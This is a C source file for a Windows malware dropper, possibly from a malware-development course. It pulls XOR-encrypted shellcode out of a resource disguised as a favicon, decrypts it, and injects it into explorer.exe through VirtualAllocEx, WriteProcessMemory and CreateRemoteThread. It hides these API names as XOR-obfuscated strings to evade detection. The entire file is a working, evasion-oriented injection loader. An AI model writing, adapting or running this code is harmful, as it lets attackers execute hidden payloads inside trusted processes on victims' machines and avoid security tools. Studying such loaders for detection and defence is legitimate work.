/*
Final dropper:
	- extract shellcode from .rsrc
	- decrypt shellcode XOR
	- inject shellcode into explorer.exe
	- get rid of console window (pop up)
	- functions obfuscation
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "resources.h"

// VirtualAllocEx
LPVOID (WINAPI * pVAE)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

// WriteProcessMemory
BOOL (WINAPI * pWPM)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T  *lpNumberOfBytesWritten
);

// CreateRemoteThread
HANDLE (WINAPI * pCRT)(
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId
);

// VirtualAlloc
LPVOID (WINAPI * pVA)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

// RtlMoveMemory
VOID (WINAPI * pRMM)(
	VOID UNALIGNED *Destination,
	VOID UNALIGNED *Source,
	SIZE_T         Length
);

// WaitForSingleObject
DWORD (WINAPI * pWFSO)(
	HANDLE hHandle,
	DWORD  dwMilliseconds
);

// CreateToolhelp32Snapshot
HANDLE (WINAPI * pCTh32S)(
	DWORD dwFlags,
	DWORD th32ProcessID
);

void rox(char * data, size_t data_len) {
	
	unsigned char key[] = "sentinel";
	unsigned int key_len = sizeof(key);
	int j;
	j = 0;
	
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

int findT(const char *procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;
	
	unsigned char k32dll[] = { 0x18,0x00,0x1c,0x1a,0x0c,0x02,0x56,0x5e,0x5d,0x01,0x02,0x18,0x00 };
	rox((char *) k32dll, sizeof(k32dll)-1);

	unsigned char sCTh32S[] = { 0x30,0x17,0x0b,0x15,0x1d,0x0b,0x31,0x03,0x1c,0x09,0x06,0x11,0x05,0x1e,0x56,0x5e,0x20,0x0b,0x0f,0x04,0x1a,0x06,0x0a,0x18,0x00 };
	rox((char *) sCTh32S, sizeof(sCTh32S)-1);
	pCTh32S = GetProcAddress(GetModuleHandle(k32dll), sCTh32S);
	hProcSnap = pCTh32S(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
			
	pe32.dwSize = sizeof(PROCESSENTRY32); 
			
	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}
			
	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}
			
	CloseHandle(hProcSnap);
			
	return pid;
}

int Inject(HANDLE hProc, unsigned char * pld, unsigned int pld_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	
	unsigned char k32dll[] = { 0x18,0x00,0x1c,0x1a,0x0c,0x02,0x56,0x5e,0x5d,0x01,0x02,0x18,0x00 };
	rox((char *) k32dll, sizeof(k32dll)-1);

	unsigned char sVAE[] = { 0x25,0x0c,0x1c,0x00,0x1c,0x0f,0x09,0x2d,0x1f,0x09,0x01,0x17,0x2c,0x16,0x00 };
	rox((char *) sVAE, sizeof(sVAE)-1);
	pVAE = GetProcAddress(GetModuleHandle(k32dll), sVAE);
	pRemoteCode = pVAE(hProc, NULL, pld_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	
	unsigned char sWPM[] = { 0x24,0x17,0x07,0x00,0x0c,0x3e,0x17,0x03,0x10,0x00,0x1d,0x07,0x24,0x0b,0x08,0x03,0x01,0x1c,0x00 };
	rox((char *) sWPM, sizeof(sWPM)-1);
	pWPM = GetProcAddress(GetModuleHandle(k32dll), sWPM);
	pWPM(hProc, pRemoteCode, (PVOID)pld, (SIZE_T)pld_len, (SIZE_T *)NULL);
	
	unsigned char sCRT[] = { 0x30,0x17,0x0b,0x15,0x1d,0x0b,0x37,0x09,0x1e,0x0a,0x1a,0x11,0x3d,0x06,0x17,0x09,0x12,0x01,0x00 };
	rox((char *) sCRT, sizeof(sCRT)-1);
	pCRT = GetProcAddress(GetModuleHandle(k32dll), sCRT);
	hThread = pCRT(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);

	unsigned char sWFSO[] = { 0x24,0x04,0x07,0x00,0x2f,0x01,0x17,0x3f,0x1a,0x0b,0x09,0x18,0x0c,0x21,0x07,0x06,0x16,0x06,0x1a,0x00 };
	rox((char *) sWFSO, sizeof(sWFSO)-1);
	pWFSO = GetProcAddress(GetModuleHandle(k32dll), sWFSO);
	
	if (hThread != NULL) {
		pWFSO(hThread, 500);
		CloseHandle(hThread);
		return 0;
	}
	return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
	
	void * menexec;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * pld;
	unsigned int pld_len;
	
	int pid = 0;
	HANDLE hProc = NULL;

	unsigned char k32dll[] = { 0x18,0x00,0x1c,0x1a,0x0c,0x02,0x56,0x5e,0x5d,0x01,0x02,0x18,0x00 };
	rox((char *) k32dll, sizeof(k32dll)-1);

	// Extract pld from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	pld = (char *) LockResource(resHandle);
	pld_len = SizeofResource(NULL, res);
	
	// Allocate some memory buffer for pld
	unsigned char sVA[] = { 0x25,0x0c,0x1c,0x00,0x1c,0x0f,0x09,0x2d,0x1f,0x09,0x01,0x17,0x00 };
	rox((char *) sVA, sizeof(sVA)-1);
	pVA = GetProcAddress(GetModuleHandle(k32dll), sVA);
	menexec = pVA(0, pld_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//printf("%-20s : 0x%-016p\n", "pld addr", (void *)pld);
	//printf("%-20s : 0x%-016p\n", "menexec addr", (void *)menexec);

	// Copy pld to new memory buffer
	unsigned char sRMM[] = { 0x21,0x11,0x02,0x39,0x06,0x18,0x00,0x21,0x16,0x08,0x01,0x06,0x10,0x00 };
	rox((char *) sRMM, sizeof(sRMM)-1);
	pRMM = GetProcAddress(GetModuleHandle("ntdll.dll"), sRMM);
	pRMM(menexec, pld, pld_len);

	// Decrypt pld
	rox((char *) menexec, pld_len);

	//printf("\nHit me!\n");
	//getchar();

	// Injection process
	pid = findT("explorer.exe");

	if (pid) {
		//printf("Explorer.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
			FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, menexec, pld_len);
			CloseHandle(hProc);
		}
	}

	return 0;
}
